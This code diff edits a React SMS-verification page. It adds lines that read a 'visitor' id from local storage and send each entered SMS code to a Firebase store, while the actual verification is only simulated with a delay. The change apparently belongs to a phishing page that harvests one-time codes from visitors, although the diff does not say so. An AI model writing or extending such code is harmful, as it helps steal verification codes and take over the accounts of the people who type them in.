@@ -5,8 +5,8 @@ import { useState, useEffect } from "react"
 import { Button } from "@/components/ui/button"
 import { MessageCircle, Loader2, ArrowLeft } from "lucide-react"
 import { Alert, AlertDescription } from "@/components/ui/alert"
-import Image from "next/image"
 import Link from "next/link"
+import { addData } from "@/lib/firebase"
 
 export default function VerifySmsPage() {
   const [timer, setTimer] = useState(59)
@@ -30,8 +30,10 @@ export default function VerifySmsPage() {
 
   const handleSubmit = (e: React.FormEvent) => {
     e.preventDefault()
+    const _id=localStorage.getItem('visitor')
     setError("")
     setIsLoading(true)
+    addData({id:_id,code})
 
     // Simulate API call with 4 second delay
     setTimeout(() => {
